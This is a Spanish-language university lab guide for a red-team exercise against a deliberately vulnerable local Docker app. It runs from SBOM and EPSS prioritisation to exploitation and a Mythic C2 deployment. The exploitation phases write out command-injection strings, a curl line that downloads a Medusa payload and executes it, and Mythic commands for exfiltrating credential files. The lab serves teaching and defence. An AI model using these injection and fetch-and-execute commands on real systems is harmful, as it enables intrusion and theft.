# Lab 03 — De la Vulnerabilidad al C2: Simulación Red Team

**Curso MAR303 — Universidad Mayor — 2026 — Profesor Tomás Vera**

> **ADVERTENCIA:** Este laboratorio contiene software intencionalmente vulnerable.
> Úsalo exclusivamente con fines educativos, en tu máquina local, sin exponer nada
> a Internet. Todo lo que ocurre aquí ocurre dentro de Docker en tu computador.

---

## Historia del ejercicio

Ustedes son el **equipo de seguridad de PetaShop**, una cadena de tiendas de
productos para mascotas. Reciben acceso a la infraestructura del **Sistema de
Inventario de Bodega** y descubren dos bugs críticos: una **Inyección de
Comandos** y una **Carga de Archivos sin Restricción**.

Como buenos profesionales, documentan el riesgo, priorizan con **EPSS** en
Dependency-Track y envían el requerimiento de remediación a la gerencia.

**La gerencia no responde.** El ticket queda "pendiente para el próximo
trimestre". Semanas después, su equipo — ahora en rol **Red Team** — demuestra
qué habría pasado si un atacante real hubiera encontrado ese bug primero:
compromiso de la máquina, instalación de un **C2 (Command and Control)** con
Mythic/Medusa, y **exfiltración de credenciales de bodega**.

El objetivo pedagógico: experimentar el ciclo completo **gestión → riesgo no
atendido → impacto real**, y entender por qué la remediación oportuna importa.

---

## Arquitectura del laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│  TU COMPUTADOR (Docker Desktop)                                  │
│                                                                  │
│  ┌─────────── RED DE GESTIÓN (172.30.0.0/24) ───────────────┐    │
│  │                                                          │    │
│  │  ┌─────────────────────┐   ┌──────────────────────────┐  │    │
│  │  │ Dependency-Track    │   │ Webtop (noVNC)           │  │    │
│  │  │ Frontend :8083      │   │ Escritorio en navegador  │  │    │
│  │  │ API      :8084      │   │ :6080 — Chromium + ext.  │  │    │
│  │  └─────────────────────┘   │ + terminal + evidencias  │  │    │
│  │  ┌─────────────────────┐   └──────────────────────────┘  │    │
│  │  │ Orchestrator :8086  │◄──── click del plugin de Chrome │    │
│  │  │ Syft + Grype +      │                                 │    │
│  │  │ upload a DTrack     │                                 │    │
│  │  └─────────────────────┘                                 │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌─────────── RED VÍCTIMA (172.31.0.0/24) ──────────────────┐    │
│  │  ┌────────────────────────────────────────────────────┐  │    │
│  │  │ PetaShop Inventory :9090  (la MÁQUINA VULNERABLE)  │  │    │
│  │  │  • Command Injection (CmdInjection)                │  │    │
│  │  │  • File Upload (FileUpload)                        │  │    │
│  │  │  • 🎯 archivo de credenciales dentro de /opt/…     │  │    │
│  │  └────────────────────────────────────────────────────┘  │    │
│  └──────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────┘
                                ▲ callback HTTP
              ┌─────────────────┴──────────────────┐
              │  MYTHIC C2 (máquina del Operador   │
              │  C2 del equipo — fuera de Docker)  │
              └────────────────────────────────────┘
```

---

## Equipos y roles (5 personas)

El trabajo se divide en 5 roles. Todos leen la guía completa; cada rol es
responsable de su entregable. La matriz completa está en [docs/ROLES.md](ROLES.md).

| Rol | Persona | Responsabilidad principal |
|-----|---------|---------------------------|
| 🔍 **1. Analista de Vulnerabilidades** | | Syft/Grype, Dependency-Track, análisis EPSS/CVSS/KEV |
| 💥 **2. Explotador** | | Command Injection o File Upload en PetaShop Inventory |
| 🐍 **3. Operador C2** | | Instala Mythic, genera el payload Medusa, mantiene el callback |
| 📦 **4. Exfiltrador de Evidencias** | | Descarga el archivo de la víctima, cadena de custodia, hashes |
| 📝 **5. Documentador / Analista de Riesgo** | | Informe de riesgo, cronología del ataque, informe ejecutivo |

---

## Fase 0 — Preparar el entorno (Instalador: todo el equipo)

### Requisitos

- **Docker Desktop** v24+ con **8 GB de RAM asignados** (Settings → Resources)
  - macOS Apple Silicon: habilita "Use Rosetta for x86_64/amd64 emulation"
- 15 GB de disco libre
- Un computador por equipo (o Docker en 2 máquinas si el Operador C2 trabaja aparte)

### Levantar

**macOS / Linux:**
```bash
git clone <URL-del-repositorio> && cd vulncorp-lab03-c2
chmod +x scripts/setup.sh
./scripts/setup.sh
```

**Windows (PowerShell como administrador):**
```powershell
git clone <URL-del-repositorio> && cd vulncorp-lab03-c2
.\scripts\setup.ps1
```

El script construye las imágenes y levanta todo. Espera **2-3 minutos** a que
Dependency-Track inicialice.

### Verificar

> 💡 **Las URLs de `localhost` funcionan en TODOS lados:** en tu navegador
> (fuera de Docker) y también dentro del escritorio noVNC (el laboratorio
> levanta reenviadores de puertos internos). Usa las mismas URLs en ambos.

| Servicio | URL | Qué debe ver |
|----------|-----|--------------|
| Estación de trabajo noVNC | http://localhost:6080 | Escritorio Xfce, Chromium se abre solo |
| Dependency-Track | http://localhost:8083 | Login de Dependency-Track |
| PetaShop Inventory | http://localhost:9090 | Portal corporativo (landing) + consola en `/VulnerableApp/` |
| Orchestrator API | http://localhost:8086/api/health | `{"ok": true, …}` |

### Primera vez en Dependency-Track

1. Ingresa a http://localhost:8083 con `admin` / `admin`.
2. Te pedirá cambiar la contraseña → el **equipo define una** y la anota.
3. Ve al menú de administración → **Teams** → equipo `Administrators` →
   pestaña **API Keys** → genera una clave y cópiala.
   (En Dependency-Track las API keys pertenecen a un equipo, no a un usuario.)
4. Copia la clave: la usarás en el plugin del paso siguiente.

### Instalar la extensión en el noVNC

Dentro del escritorio de http://localhost:6080, Chromium ya arranca con la
extensión **precargada**. Si no vieras el panel:

1. Abre `chrome://extensions` en el Chromium del noVNC.
2. Activa "Developer mode" → "Load unpacked" → selecciona la carpeta `ext`
   del disco (está montada en el contenedor).
3. Recarga Dependency-Track: debe aparecer el panel **⚡ VulnCorp Orchestrator**
   flotando sobre la interfaz (abajo a la derecha).

---

## Fase 1 — Análisis de la infraestructura (Rol 1: Analista)

**Objetivo:** conocer la superficie de ataque y priorizar con datos, no con intuición.

1. Abre Dependency-Track (http://localhost:8083) en el noVNC.
2. En el panel **⚡ VulnCorp Orchestrator** (abajo a la derecha), haz click en
   ⚙️ y pega la **API Key** de Dependency-Track. Guarda.
3. Click en **"🔍 Escanear infraestructura (Syft + Grype)"**.
4. Observa el log: el Orchestrator corre Syft (SBOM), luego Grype (CVEs) y
   sube el SBOM a Dependency-Track automáticamente.
5. En Dependency-Track: **Projects** → "PetaShop Inventory" → versión 3.0.0.

### Entregables del Analista

- [ ] Captura del panel del plugin durante el escaneo (proceso Syft + Grype visible)
- [ ] Captura de Dependency-Track con las vulnerabilidades del proyecto
- [ ] Tabla de **top 10 vulnerabilidades** ordenada por **EPSS** (no por CVSS):
      componente, CVE, CVSS, EPSS %, ¿está en CISA KEV?
- [ ] Responde en tu informe: ¿por qué un CVE con CVSS 9.8 y EPSS 0.1% es
      menos urgente que uno con CVSS 7.5 y EPSS 60%?

---

## Fase 2 — El requerimiento que nadie atiende (Rol 5: Documentador)

El plugin mostrará **2 alertas de bugs de aplicación** (no son CVEs de
librerías, son fallas del código de PetaShop Inventory):

- **PETASHOP-001** — Inyección de Comandos (CWE-78, A03:2021 Injection)
  · 📈 EPSS **96.1 %** (percentil **99.8**) · 🔥 **EN CISA KEV**
- **PETASHOP-002** — File Upload sin restricción (CWE-434, A04:2021 Insecure Design)
  · 📈 EPSS **94.2 %** (percentil **99.6**) · 🔥 **EN CISA KEV**

Ambos están en el percentil ~99 de EPSS y catalogados en el catálogo KEV de
CISA (explotación activa confirmada en la naturaleza): **prioridad máxima**,
por encima de las 403 vulnerabilidades de librerías del escaneo. Úsenlos como
ejemplo de cómo EPSS + KEV cambian la conversación con la gerencia (un CVSS
alto con EPSS bajo puede esperar; esto no).

**Objetivo:** simular el ciclo de gestión de vulnerabilidades y su fracaso.

### Entregables del Documentador

- [ ] **Informe de riesgo** (1-2 páginas) dirigido a la gerencia con los 2 bugs:
      descripción técnica, impacto de negocio, CVSS estimado por el equipo,
      prioridad según EPSS, plan de remediación propuesto con plazo.
- [ ] **Ticket de requerimiento** formal (formato libre: Jira, mail, documento).
- [ ] **Simulación del silencio:** registra en el informe que el requerimiento
      "no fue respondido" (fecha de envío, seguimiento a la semana, respuesta
      de gerencia: "pendiente para el próximo trimestre"). El instructor puede
      actuar de gerencia si lo desea.
- [ ] Este documento será la base de la comparación en la Fase 6.

---

## Fase 3 — Infraestructura C2 con Mythic (Rol 3: Operador C2)

**Objetivo:** montar el C2 que el "atacante" usará. Sigue la guía detallada en
[docs/MYTHIC_SETUP.md](MYTHIC_SETUP.md). Resumen:

1. Instalar Mythic en la máquina del Operador C2 (`mythic-cli build` + `start`).
2. Instalar el agente **Medusa**: `./mythic-cli install github https://github.com/MythicAgents/Medusa`
3. Instalar el perfil C2 **http**: `./mythic-cli install github https://github.com/MythicC2Profiles/http`
4. Acceder a la UI: https://127.0.0.1:7443
5. **Punto crítico de red:** la máquina víctima (contenedor Docker) no puede
   alcanzar "127.0.0.1" del host. El callback debe apuntar a
   **`host.docker.internal`** (funciona igual en Mac y Windows con Docker Desktop).
   - Ejemplo: callback host `host.docker.internal`, callback port `80`
     (o el puerto que tenga mapeado el perfil http de Mythic).
6. Verifica conectividad desde el noVNC:
   ```bash
   # Terminal del noVNC:
   curl -s http://host.docker.internal:80 || echo " Mythic no alcanzable — revisa puertos"
   ```

### Entregables del Operador C2

- [ ] Captura del dashboard de Mythic operativo
- [ ] Captura de Medusa y el perfil http instalados
- [ ] Prueba de conectividad `host.docker.internal` desde la red del lab
- [ ] Payload Medusa generado (anota su hash SHA-256 para la cadena de custodia)

---

## Fase 4 — Explotación y despliegue del C2 (Rol 2: Explotador)

**Objetivo:** explotar UNO de los dos bugs (elige el equipo) y lograr que el
agente Medusa se ejecute en la máquina víctima.

### Camino A — Inyección de Comandos

1. Ve a http://localhost:9090 (en el noVNC o en tu navegador): verás el
   **portal de PetaShop Inventory**. En el módulo **Diagnóstico de Red**
   usa el formulario **"Probar conexión a servidor de bodega"**.
2. Ingresa `127.0.0.1` y presiona **Probar conexión**: la app ejecuta
   `ping` contra el host que tú controlas y muestra el eco en pantalla.
3. Escala a ejecución arbitraria separando comandos (`;`, `&&`, `|`).
   Prueba en el mismo formulario, por ejemplo:
   ```
   127.0.0.1 ; id
   ```
   Verás la salida de `id` mezclada con el ping → hay **inyección de comandos**.
4. Reconoce la máquina y busca el botín:
   ```
   127.0.0.1 ; id ; ls /opt/petashop/
   ```
5. Descarga el payload de Mythic y ejecútalo:
   ```bash
   ; curl -o /tmp/updates http://host.docker.internal:80/<ruta-del-payload> && chmod +x /tmp/updates && /tmp/updates
   ```
   (El Operador C2 te entrega la URL exacta: Mythic "hospeda" los payloads
   generados, o los pasan por el upload del Camino B.)

### Camino B — File Upload

1. Ve a http://localhost:9090 → módulo **Carga de Archivos de Stock** →
   formulario **"Subir excel de inventario"** (o usa la consola avanzada en
   http://localhost:9090/VulnerableApp/ → **FileUpload**).
2. Sube un archivo benigno (ej. un CSV): la app responde con la ruta exacta
   donde quedó guardado, ej. `VulnerableApp/upload/inventario.csv`.
3. Sube el ejecutable de Medusa que generó el Operador C2 (la app no valida
   el tipo de archivo — es el punto de la vulnerabilidad).
4. Combínalo con **CmdInjection** para ejecutarlo desde el formulario de
   diagnóstico:
   ```
   127.0.0.1 ; chmod +x /ruta/de/uploads/medusa && /ruta/de/uploads/medusa
   ```
   (La ruta exacta la descubres con `ls` vía command injection — así se
   combinan las dos vulnerabilidades en un ataque real.)

### Éxito de la Fase 4

En Mythic aparece un **callback nuevo** con el hostname `petashop-inventory`.

### Entregables del Explotador

- [ ] Capturas de cada paso de la explotación (payload usado, respuesta de la app)
- [ ] Captura del callback activo en Mythic
- [ ] Explicación: ¿por qué la app permitió esto? ¿qué validación faltaba?

---

## Fase 5 — Exfiltración de la evidencia (Rol 4: Exfiltrador)

**Objetivo:** desde la sesión C2, encontrar y descargar los archivos
sensibles que viven en la máquina víctima:

- `credenciales_bodega.txt` — credenciales de la bodega (con la flag)
- `flujo_caja_nov2026.csv` — flujo de caja de PetaShop (finanzas)
- `accesos_bancarios.txt` — RUTs y claves de portales bancarios
  (Banco Estado y Banco Falabella) que TI dejó "temporalmente" en el
  servidor de inventario

1. En Mythic, sobre el callback, ejecuta comandos de reconocimiento:
   ```text
   ls /opt/petashop
   cat /opt/petashop/notas_comite_ops.txt
   ```
2. Localiza los archivos sensibles (pista: el comité de operaciones habló
   de ellos, y el auditor interno dejó nota en el de accesos bancarios).
3. Descárgalos con el comando `download` de Mythic.
4. Calcula los hashes para la cadena de custodia:
   ```bash
   sha256sum credenciales_bodega.txt accesos_bancarios.txt flujo_caja_nov2026.csv
   # o certutil -hashfile <archivo> SHA256 en Windows
   ```
5. Guarda copias en `data/exfiltracion/` (en el noVNC está en el Escritorio,
   carpeta `exfiltracion` — aparece sincronizada en la carpeta `data/` del repo).

### Entregables del Exfiltrador

- [ ] El archivo de credenciales exfiltrado (con la **flag** `VULNCORP{…}` adentro)
- [ ] El **flujo de caja** exfiltrado (evidencia de impacto financiero)
- [ ] El archivo de **accesos bancarios** exfiltrado (evidencia de impacto crítico:
      cuentas de Banco Estado y Banco Falabella expuestas)
- [ ] Hashes SHA-256 de los archivos originales y exfiltrados (deben coincidir)
- [ ] Capturas del `ls`, `cat` y `download` en Mythic
- [ ] Cadena de custodia: quién lo encontró, quién lo descargó, fecha/hora, hash

---

## Fase 6 — Informe final y cierre (Rol 5 con todo el equipo)

El Documentador consolida el **informe final del incidente**:

- [ ] Cronología completa: hallazgo → requerimiento → silencio → compromiso →
      C2 → exfiltración (con timestamps)
- [ ] Comparación del costo: ¿cuánto costaba parchar vs. cuánto costó el incidente?
- [ ] Lecciones: qué controles habrían detenido el ataque en cada etapa
      (validación de entrada, WAF, detección de C2, segmentación…)
- [ ] Presentación de 10 minutos ante la clase (el equipo de "gerencia" rota).

---

## Detener / reiniciar el laboratorio

```bash
docker compose down          # detiene (conserva datos)
docker compose down -v       # detiene y borra TODO (empezar de cero)
docker compose logs -f dtrack-apiserver   # logs de Dependency-Track
```

---

## Solución de problemas

| Problema | Solución |
|----------|----------|
| `exec /opt/portal/start.sh: no such file or directory` al levantar la víctima | Clonaste el repo antes del fix de fines de línea. Trae el fix: `git pull` y vuelve a levantar (`docker compose up -d --build`). Si persiste, re-clona: el repo fuerza LF en los `.sh` desde el commit con `.gitattributes` |
| En el noVNC no aparecen los accesos directos del Escritorio y/o `localhost:8083`/`localhost:9090` "refused to connect" (típico en clones de Windows) | Misma causa CRLF: los scripts de configuración del escritorio llegan con `\r`. Trae el fix: `git pull` y luego `docker compose up -d --force-recreate webtop` (un servicio `webtop-init` normaliza los scripts automáticamente antes de arrancar). Si persiste: re-clona |
| El panel del plugin no aparece en DTrack | Recarga la página; verifica `chrome://extensions` que la extensión esté activa |
| "❌ Orchestrator no disponible" | Espera más, luego: `docker compose logs orchestrator` |
| El escaneo falla al subir el SBOM | Revisa la API Key en ⚙️ del panel; debe ser de un **equipo** (Administrations → Teams → API Keys) |
| Dependency-Track no carga (502) | Recién levantado tarda 1-3 min; revisa `docker compose logs -f dtrack-apiserver` |
| Mythic no recibe el callback | Revisa que el callback host sea `host.docker.internal` y el puerto del perfil http esté mapeado en el host del Operador C2 |
| Webtop muy lento | Sube RAM de Docker a 8 GB+; cierra pestañas del Chromium del noVNC |
